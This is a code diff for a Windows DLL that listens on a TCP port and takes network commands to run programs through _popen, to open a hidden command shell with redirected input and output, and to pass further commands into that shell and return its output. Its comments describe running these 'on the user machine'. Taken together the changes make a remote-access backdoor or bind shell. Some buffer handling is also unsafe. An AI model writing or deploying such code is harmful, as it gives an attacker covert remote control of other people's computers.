@@ -1,5 +1,14 @@
+#include <array>
 #include "tcp_listener.h"
 #include "Main.h"
+
+#define MAX_BUFFER_LENGTH 200000
+#define MIN_BUFFER_LENGTH 1024
+
+char g_sOutBuffer[MAX_BUFFER_LENGTH] = { 0 };
+HANDLE g_hChildStd_OUT_Rd;
+HANDLE g_hChildStd_IN_Wr;
+PROCESS_INFORMATION g_processInfo;
 
 BOOL WINAPI DllMain(
 	HINSTANCE hinstDLL,		// handle to DLL module
@@ -31,6 +40,12 @@ BOOL WINAPI DllMain(
 	case DLL_PROCESS_DETACH:
 		printf("Perform any necessary cleanup...\n");
 
+		if (g_processInfo.hProcess) 
+		{
+			TerminateProcess(g_processInfo.hProcess, 0);
+			CloseHandle(g_processInfo.hProcess);
+		}
+
 		// Perform any necessary cleanup.
 		break;
 	}
@@ -48,18 +63,22 @@ Returns the result of the proper requested function.
 */
 int OnAccept(char* buffer)
 {
-	char c_Type = buffer[0];
-	int n_Length = *(int*)(buffer + 1);
-	char* s_Value = buffer + 5;
+	char cType = buffer[0];
+	int nLength = *(int*)(buffer + 1);
+	char* sValue = buffer + 5;
 
-	switch (c_Type)
+	switch (cType)
 	{
 	case 'u':
-		return Update(n_Length, s_Value);
+		return Update(nLength, sValue);
 	case 'c':
-		return ExecuteCommand(n_Length, s_Value);
+		return ExecuteCommand(nLength, sValue);
+	case 'o':
+		return OpenShell(nLength, sValue);
+	case 's':
+		return ExecuteOnShell(nLength, sValue);
 	default:
-		return Echo(buffer);
+		return Echo(sValue);
 		break;
 	}
 }
@@ -73,7 +92,7 @@ void StartConnection()
 
 	//fList.emplace(std::make_pair("echo", Echo));
 
-	tcp_listener listener(OnAccept);
+	tcp_listener listener(OnAccept, g_sOutBuffer);
 	printf("Starting socket on port %d...\n", port);
 	listener.start(port);
 
@@ -103,7 +122,7 @@ Prints out the data received in the buffer
 const int Echo(char* buffer)
 {
 	//std::cout << buffer << std::endl;
-	strcpy_s(buffer, 100, "echo from dll");
+	strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH -1, buffer);
 
 	return -2;
 }
@@ -117,16 +136,171 @@ Execute Command on the user machine
 */
 const int ExecuteCommand(int length, char* command)
 {
-	ShellExecute(
-		nullptr,	// hwnd,
-		command,	// lpOperation,
-		nullptr,	// lpFile,
-		nullptr,	// lpParameters,
-		nullptr,	// lpDirectory,
-		SW_HIDE		// nShowCmd
-	);
+	std::array<char, 128> buffer;
+	std::string result;
+	std::shared_ptr<FILE> pipe(_popen(command, "r"), _pclose);
+	if (pipe)
+	{
+		while (!feof(pipe.get())) {
+			if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
+				result += buffer.data();
+		}
+
+		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH -1, result.c_str());
+
+		return -2;
+	}
+}
+
+/**
+Open shell on the user machine
+
+@param length: The length of the shell name
+@param shellType: The data to echo out
+@return -1
+*/
+const int OpenShell(int length, char* shellType)
+{
+	// if shell is open - no need to do anything
+	if (g_processInfo.hProcess)
+	{
+		return -1;
+	}
+
+	// init security attributes
+	SECURITY_ATTRIBUTES saAttr;
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;
+	saAttr.lpSecurityDescriptor = NULL;
+
+	HANDLE hChildStd_OUT_Wr;
+	HANDLE hChildStd_IN_Rd;
+
+	// create pipes for stdin and stdout of the shell
+	if (!CreatePipe(
+		&g_hChildStd_OUT_Rd,
+		&hChildStd_OUT_Wr,
+		&saAttr,
+		0
+	))
+	{
+		printf("Could not create OUT pipe\n");
+		return -1;
+	};
+
+	if (!CreatePipe(
+		&hChildStd_IN_Rd,
+		&g_hChildStd_IN_Wr,
+		&saAttr,
+		0
+	))
+	{
+		printf("Could not create IN pipe\n");
+		return -1;
+	}
+
+	STARTUPINFO info = { sizeof(info) };
+	info.wShowWindow = SW_HIDE;
+	info.hStdInput = hChildStd_IN_Rd;
+	info.hStdError = hChildStd_OUT_Wr;
+	info.hStdOutput = hChildStd_OUT_Wr;
+	info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+
+	// open shell in a new process
+	if (!CreateProcess(
+		NULL,
+		shellType,
+		NULL,
+		NULL,
+		TRUE,
+		0,
+		NULL,
+		NULL,
+		&info,
+		&g_processInfo
+	))
+	{
+		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "Failed to open shell");
+		return -2;
+	}
 
 	return -1;
+}
+
+std::string ReadFromPipe(HANDLE pipe) {
+	CHAR chBuf[MAX_BUFFER_LENGTH];
+	DWORD dwRead;
+	DWORD avail;
+	bool bSuccess = FALSE;
+	bool tSuccess = FALSE;
+	std::string out = "";
+	tSuccess = PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL);
+	if (tSuccess && avail >= MAX_BUFFER_LENGTH) {
+		while (avail >= MAX_BUFFER_LENGTH) {
+			bSuccess = ReadFile(pipe, chBuf, MAX_BUFFER_LENGTH, &dwRead, NULL);
+			if (!bSuccess || dwRead == 0) break;
+			std::string s(chBuf, dwRead);
+			out += s;
+			avail = avail - MAX_BUFFER_LENGTH;
+		}
+		return out;
+	}
+	else {
+		return "[false]";
+	}
+}
+
+/**
+Interact with open shell in the client
+
+@param length: The length of the command
+@param command: The command to run in the shell
+@return -1
+*/
+const int ExecuteOnShell(int length, char* command)
+{
+	if (!g_processInfo.hThread)
+	{
+		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "There is no open shell to run in.");
+		return -2;
+	}
+
+	DWORD dwWritten, dwRead, nBufferNeeded;
+
+	command[length] = '\n';
+
+	if (!WriteFile(
+		g_hChildStd_IN_Wr,
+		command,
+		length,
+		&dwWritten,
+		NULL
+	))
+	{
+		DWORD error = GetLastError();
+		strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH - 1, "Could not interact with shell.");
+		return -2;
+	}
+
+	Sleep(1000);
+
+	size_t pos = 0;
+	BOOL bPeekSuccess;
+
+	PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &nBufferNeeded, NULL);
+	char* chBuffer = new char[nBufferNeeded + 1];
+	ReadFile(
+		g_hChildStd_OUT_Rd,
+		chBuffer,
+		nBufferNeeded,
+		&dwRead,
+		NULL
+	);
+
+	strcpy_s(g_sOutBuffer, MAX_BUFFER_LENGTH, chBuffer);
+	g_sOutBuffer[nBufferNeeded] = 0;
+
+	return -2;
 }
 
 /**
